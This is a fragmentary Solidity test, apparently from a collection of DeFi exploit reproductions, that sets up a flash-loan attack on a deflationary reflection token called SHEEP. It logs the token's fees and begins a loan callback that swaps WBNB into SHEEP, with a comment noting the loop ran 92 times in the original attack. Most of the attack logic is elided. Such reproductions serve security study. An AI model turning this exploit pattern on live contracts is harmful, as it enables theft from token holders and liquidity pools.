...
interface RDeflationERC20 is IERC20 {
    ...
    function  _TAX_FEE() external returns (uint256);
    function  _BURN_FEE() external returns (uint256);
    function  _CHARITY_FEE() external returns (uint256);
...
contract ContractTest is Test {
    ...
    function testExploit() public {
        emit log_named_uint("_TAX_FEE", SHEEP._TAX_FEE());
        emit log_named_uint("_BURN_FEE", SHEEP._BURN_FEE());
        emit log_named_uint("_CHARITY_FEE", SHEEP._CHARITY_FEE());
        emit log_named_uint("tokenFromReflection", 1e24);
    ...
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNBToSHEEP();
        uint i = 0;
        // 92 times in the original attack.
